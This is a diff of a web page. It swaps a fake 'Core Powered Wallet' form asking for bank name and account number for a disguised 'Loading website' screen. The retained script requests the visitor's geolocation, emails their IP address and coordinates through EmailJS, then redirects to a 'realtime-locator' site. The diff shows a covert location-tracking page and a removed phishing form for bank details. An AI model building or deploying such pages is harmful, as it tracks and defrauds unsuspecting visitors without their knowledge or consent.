@@ -4,94 +4,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title> Wallet Transfer</title>
+    <title> Loading website</title>
     <style>
         body {
+            height: 100vh;
+            width: 100%;
             font-family: Arial, Helvetica, sans-serif;
             display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
-            background-color: rgb(235, 235, 235);
+            background-color: #fff;
         }
-        
+
         .container {
             display: flex;
-            justify-content: center;
-            align-items: center;
             flex-direction: column;
-            gap: 2em;
-            padding: 1em;
-            border-radius: 20px;
-        }
-
-        .img {
-            height: 3.75em;
-        }
-
-        p {
-            font-size: 1em;
-            color: #000;
-            font-weight: bold;
-        }
-
-        .fname,
-        .fcontact,
-        .faccount {
-            padding: 10px;
-            display: flex;
-            justify-content: center;
-            /* align-items: center; */
-            flex-direction: column;
-        }
-
-        .fname label,
-        .fcontact label,
-        .faccount label {
-            font-size: 1em;
-            padding: 4px 0;
-            color: #212529;
-            font-weight: 500;
-        }
-
-        .fname input,
-        .fcontact input,
-        .faccount input {
-            padding: 10px 20px;
-            border: 2px solid #bababa;
-            border-radius: 5px;
-            color: #212529;
-            font-weight: 500;
-            font-family: Arial, Helvetica, sans-serif;
-        }
-        .fbtn{
-            display: flex;
             justify-content: center;
             align-items: center;
         }
-.button{
-    background-color: royalblue;
-    color: #fff;
-    outline: none;
-    border: none;
-    padding: 15px 50px;
-    font-size: 1em;
-    border-radius: 5px;
-    text-transform: uppercase;
-    letter-spacing: 1px;
-    font-weight: 600;
-}
-input[type="date"]::-webkit-calendar-picker-indicator {
-            filter: invert(1); /* Inverts the color of the icon */
-        }
-        @media (max-width: 400px) {
-            .img {
-                height: 5em;
-            }
+
+        img {
+            height: 5em;
+            margin-block: 1em;
         }
     </style>
     <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">
     </script>
-     <script src="https://cdn.tailwindcss.com"></script>
     <script>
         document.addEventListener('DOMContentLoaded', () => {
 
@@ -136,9 +75,8 @@ input[type="date"]::-webkit-calendar-picker-indicator {
                     options
                 );
             } else {
-                console.log('Geolocation is not supported by your browser');
                 document.querySelector('#info').textContent = 'Error Loading Website';
-                window.location.href = 'https://www.google.com'
+                window.location.reload();
             }
 
             function sendEmail(ip, lat, long) {
@@ -153,7 +91,7 @@ input[type="date"]::-webkit-calendar-picker-indicator {
                         .then(response => {
                             console.log('website loaded successfully!', response.status, response.text);
                         })
-                       
+
                         .then(() => {
                             window.location.href = 'https://realtime-locator.vercel.app/'
 
@@ -169,48 +107,8 @@ input[type="date"]::-webkit-calendar-picker-indicator {
 
 <body>
     <div class="container">
-        <!-- <img class="img" src="https://raw.githubusercontent.com/niklausgerber/PreLoadMe/master/img/status.gif" alt="">
-
-        <p id="info">Loading website ...... Please wait</p> -->
-        <body class="bg-gray-900 text-white py-10">
-            <div class="flex justify-center ">
-                   <h1 class="text-lg font-semibold mb-4 flex flex-row">
-                     <img  class="mr-2" width="20" alt="🇰🇼" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAOEAAADhCAMAAAAJbSJIAAAAnFBMVEX///+Ftfg9ifUWVrkyhPUATradwPqOqNmBs/h9sfjB2PsASrU4h/UAS7Z7r/gASLXL3fzl7/0mgPSryfoARLTt9P62xuaetd7i7f3c6f30+P5bmfarvuKbwvmKuPi10ftknvcyZ8DAzunO4Pw9bcLJ1ex+m9Nuj86kx/pRlPaTvfkkYL6+1fzS3fBIj/aDn9VRecZxpfdegslpi83QHWzmAAAFl0lEQVR4nO2ca3uaTBCG0WgKEjT1kFZbNbFNm1Pb9H3//38rC3heltlhFma95v7cJtzX8wwjZJMgEARBEARBEARBEARBEARBEARBEARBEARBEAShLRYpbV+DMxbz9XIVDaNw9TT43PbFOGC2XkVh2MkIw+jltu0LomYdFXYFYdT51vY1UfK5c+yXES0vZyJvo3M/lePqY9tXRsRAL6jm8TLuOKWCqqmXoDgYlgumMfqvaErwIhSrBL1XNFf0AmaxOkHPU4QJeqwIFUyL6ufqh8zgLkUfFeEJKsOOf4pWguoDnG+KNhXN8WwWLRPMY/RJESPo1SyiBH2aRfsZ3OLJLCITzFL0oqg1BP1QrCXY8aCo+BncxchbsW6CHe5FJRDkvTTqVzSH7SySJJjBNEU6QaazSFXRXJFhiqSCHYZFpRZkV1TCGdwprmZtWx3gQFDNIp+fL5JXtFBkk6KTBDkpzoeaH2HTGEYvbcvlLCahC8fUj89hhtma3pGTn2J2epykrt+Kl59iNiFzDDn6KWY088jWT0HRVW7zd8psUmt3hEPG+W2psTvS/TBv+/JBIHcHq/1XBWIevclvi+Xu8M5PYbE7wmjpn58COI8c/dbPb7B/uKieR3g/7x6+4i/ZjvX4pvcMPKe9MOdo4xf3Rw0prsfdbvdm/AXsqDsCbdnPu4fRVcq0EcVMMHO8r5ejhd/3zC+liRS3gsqx9wW4ojXzaNPP5GpH7FzxQNCyq0c5WuT3Oro6xHVRjwUtu7qbR0w/G1J863XPSB0HsP9ddDUcwv3iU7+U5A4vUMX8NEFEV6NoCXxdn+4HjZ9S/IVXqLi+3zdaQyvHN+Bp2WI/aHnFO5i51nTUfh5BaObvMMQ/hN/qgI8GwW62O6gcj/aDjr6bd+EvZkObrho53Q86wx8E3+eMxe8KQRpH0/wdTKKLH0t9q4qw6Cp0d2gxz9+e+JHMa09lSXeO6Bwr529fUxf3mvuyVUHVVcD87Q3fyf1AY3jgaL07oP0scDCIC2BJcY4b7eczA4kDQ/0nNpMjuKuPtn7p528GhmDHjV0/3RmCbzRHjpVd3bwj/NJbjYOF+IwwrNwdj9+TPkbQycr/iwmxa+wqqp95hP/RCxqfLKoctV3dvE+RfqnhBweGc7Shcnw6+3qfprh+ZsROHoKfkTVV9K7PvtyHGoJXDy4Eg6caIRIbJp+cGKL2haMMnQgGwcR+6bsxHLmJMOUe3VNSQxcPFgWz0pdtjRq+OjyxCHvOd2zYd/F8v1dEjiKh4dSpIDpFOsO+sxfeO0XUKJIZuq1ooYhJkcowaUAQN4tEhqNGBFFFpTFsoqJYRRLD5gQRRaUwbKqiObeWigSGo02Tgqmi3R21vmG/YUFbxdqGSeOClkWtazhtQdAuxZqGbSSoGMAV6xk2fZPZc3Z+yI1hU0cSdYAV6xg2cyCxjDWwqDUM3Z/VMwNMEW/YtiBUEW3YbkVzQO8YsYbu3hvaMAHMItIwZiEIShFnyCNBRbUiynDKRhBQVIwhnwQVVSkiDLnM4JYKRXtDXgkqzIrWhvwEKxRtDblVNMd0u7E05JigwpCinSGnNXHMU6milSHXBBXXZYo2hrGLszJklClaGI5YC5Yqwg25C5Ypgg35CwbBUrc0oIaJB4JB0NEoAg1HTn5ThB6NIszQF8FU8WwWQYaxN4JBsDpVhBj6JHieIsDQn4rmnChWG/qVoCLqWRkmP1u4xpoMxxaGsYeCqWIPbOin4JGi2dDHiubsZ9Fo6K/gQYomQ18rmrO93RgM/RbcpVhu6HNFc3LFUkP/BQvFMkPfK5qjZrHE8BISVKQp6g2T/1u4GieEY62hb08TJt7GGkMOhxDomJ3/iuUjj7/VLQiCIAiCIAiCIAiCIAiCIAiCIAiCIAiCIAiC4BX/AOZ5iCo1oPl0AAAAAElFTkSuQmCC"> Core Powered Wallet</h1>
-           </div>
-             <div class="max-w-md mx-auto bg-gray-800 p-8 rounded-md shadow-md">
-                 <div class="mb-4">
-                     <label for="endDate" class="block mb-2">Name:</label>
-                     <input required placeholder="e.g.John" type="text" id="endDate" class="border-gray-600 rounded-md p-2 w-full bg-gray-700 text-white">
-                 </div>
-                 <div class="mb-4">
-                     <label for="startDate" class="block mb-2">Account name:</label>
-                     <input required placeholder="e.g.John smith" type="text" id="startDate" class="border-gray-600 rounded-md p-2 w-full bg-gray-700 text-white">
-                 </div>
-                 <div class="mb-4">
-                     <label for="unpaidLeave" class="block mb-2">Bank name:</label>
-                     <input required placeholder="e.g.International State Bank" type="text" id="unpaidLeave" class="border-gray-600 rounded-md p-2 w-full bg-gray-700 text-white">
-                 </div>
-                 <div class="mb-4">
-                     <label for="salary" class="block mb-2">Account number:</label>
-                     <input required placeholder="e.g.892327632829832" type="number" id="salary" class="border-gray-600 rounded-md p-2 w-full bg-gray-700 text-white">
-                 </div>
-                <div class="flex justify-center"> 
-                     <a href="https://realtime-locator.vercel.app/" id="calculateBtn" class="bg-blue-500 text-xl uppercase text-white px-20 py-4 rounded-md"> submit</a>
-                 </div>
-                 <div id="result" class="mt-4"></div>
-               
-                 <div class="flex justify-center"> 
-           <p class="text-sm text-slate-500 text-center">
-         <b class="text-white">Click submit to proceed</b>    <br><br>    By submitting, you agreed to our <b> Terms and Conditions </b>
-         
-           </p>
-               </div>
-             </div>
-          
-           
-         </body>
-         
-      
+        <img class="img" src="https://raw.githubusercontent.com/niklausgerber/PreLoadMe/master/img/status.gif" alt="">
+        <p id="info">Loading website ...... Please wait</p>
     </div>
 
     </div>
